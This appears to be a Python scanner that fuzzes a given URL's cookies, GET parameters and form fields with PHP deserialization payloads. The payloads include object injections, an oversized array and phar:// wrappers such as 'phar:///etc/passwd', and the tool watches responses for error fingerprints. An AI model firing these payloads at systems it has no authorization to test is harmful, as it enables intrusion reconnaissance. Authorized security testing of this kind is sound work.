import requests
import base64
import time
import sys
import re
from urllib.parse import urlparse, parse_qs

# ==============================================================================
# BIBLIOTECA DE 100+ PAYLOADS PARA FINGERPRINTING
# ==============================================================================
PAYLOADS = {
    "SYNTAX_ERRORS": [
        "a:1:{", "O:8:\"Exploit\":0:", "s:5:\"abc\";", "i:123", "b:2;", "d:12.34", "N", 
        "a:1:{s:1:\"a\";i:1", "O:1:\"A\":1:{s:1:\"b\";s:1:\"c\"}", "s:0:\"\";",
        "O:999:\"A\":0:{}", "r:1;", "R:1;", "C:8:\"MyClass\":0:{}"
    ],
    "CLASS_INJECTIONS": [
        "O:14:\"NonExistentXYZ\":0:{}", "O:8:\"Database\":0:{}", "O:7:\"Session\":0:{}",
        "O:8:\"Exception\":2:{s:7:\"message\";s:5:\"VULN\";s:4:\"code\";i:1;}",
        "O:11:\"SplPriorityQueue\":0:{}", "O:10:\"SplStack\":0:{}"
    ],
    "PHAR_WRAPPERS": [
        "phar://test.phar", "phar://test.jpg", "php://filter/resource=phar://test.phar",
        "phar:///etc/passwd"
    ],
    "ADVANCED_FUZZING": [
        "a:100000:{i:0;i:1;}", 
        "O:4:\"User\":1:{S:11:\"\\00User\\00name\";s:5:\"admin\";}",
        "O:4:\"User\":1:{s:8:\"username\";r:1;}",
        "S:5:\"\\x61\\x62\\x63\\x64\\x65\";"
    ]
}

# Assinaturas de serialização PHP (Puro e Base64)
SERIAL_SIGS = [
    r'^O:\d+:"', r'^a:\d+:{', r'^s:\d+:"', r'^i:\d+;', r'^b:[01];', r'^d:\d+\.\d+;', # Puro
    r'^Tzo', r'^YTo', r'^czo', r'^aTo', r'^Yjo', r'^ZDo' # Base64 (O:, a:, s:, i:, b:, d:)
]

# ==============================================================================
# FUNÇÃO SMART DISCOVERY
# ==============================================================================
def smart_discovery(url):
    print(f"[*] Iniciando Smart Discovery em: {url}")
    found_targets = []
    
    try:
        # 1. Analisar Cookies
        r = requests.get(url, timeout=10)
        for name, value in r.cookies.items():
            for sig in SERIAL_SIGS:
                if re.match(sig, value):
                    print(f"[+] Alvo Detectado em Cookie: {name} (Valor parece serializado)")
                    found_targets.append((name, 'cookie'))
                    break

        # 2. Analisar Parâmetros de URL (GET)
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for p in params:
            for val in params[p]:
                for sig in SERIAL_SIGS:
                    if re.match(sig, val):
                        print(f"[+] Alvo Detectado em GET: {p}")
                        found_targets.append((p, 'get'))
                        break

        # 3. Analisar HTML em busca de Inputs (POST)
        inputs = re.findall(r'name=["\'](.*?)["\'].*?value=["\'](.*?)["\']', r.text)
        for name, value in inputs:
            for sig in SERIAL_SIGS:
                if re.match(sig, value):
                    print(f"[+] Alvo Detectado em Campo de Formulário (POST): {name}")
                    found_targets.append((name, 'post'))
                    break

    except Exception as e:
        print(f"[X] Erro durante Discovery: {e}")
    
    return list(set(found_targets)) # Remover duplicatas

# ==============================================================================
# ENGINE DE SCAN
# ==============================================================================
FINGERPRINTS = [
    "unserialize():", "Error at offset", "Class not found", 
    "__destruct()", "__wakeup()", "internal corruption in phar"
]

def analyze(response, p_name, p_val, elapsed):
    found = [fp for fp in FINGERPRINTS if fp.lower() in response.text.lower()]
    if found or response.status_code == 500:
        print(f"\n[!] VULNERABILIDADE CONFIRMADA!")
        print(f"    - Payload: {p_val[:40]}...")
        print(f"    - Pistas: {', '.join(found) if found else 'Erro 500'}")
        return True
    return False

def run_fuzzer(url, param, method):
    print(f"\n[+] Fuzzing Intensivo: {param} ({method.upper()})")
    count = 0
    for cat, list_p in PAYLOADS.items():
        for p in list_p:
            count += 1
            variants = [p, base64.b64encode(p.encode()).decode()]
            for v in variants:
                try:
                    if method == "get": r = requests.get(url, params={param: v}, timeout=5)
                    elif method == "post": r = requests.post(url, data={param: v}, timeout=5)
                    elif method == "cookie": r = requests.get(url, cookies={param: v}, timeout=5)
                    analyze(r, cat, v, 0)
                except: pass
    print(f"[*] Testes concluídos para {param}.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\nUSO: python scanner.py <URL> [PARAM] [METHOD]")
        sys.exit(1)

    target_url = sys.argv[1]
    
    # Se o usuário não passou parâmetro, usa Smart Discovery
    if len(sys.argv) == 2:
        targets = smart_discovery(target_url)
        if not targets:
            print("[?] Nenhum parâmetro serializado detectado automaticamente.")
            print("[?] Tente especificar manualmente: python scanner.py <URL> <PARAM> <METHOD>")
        else:
            for param, method in targets:
                run_fuzzer(target_url, param, method)
    else:
        # Modo Manual
        param_name = sys.argv[2]
        method_name = sys.argv[3].lower()
        run_fuzzer(target_url, param_name, method_name)
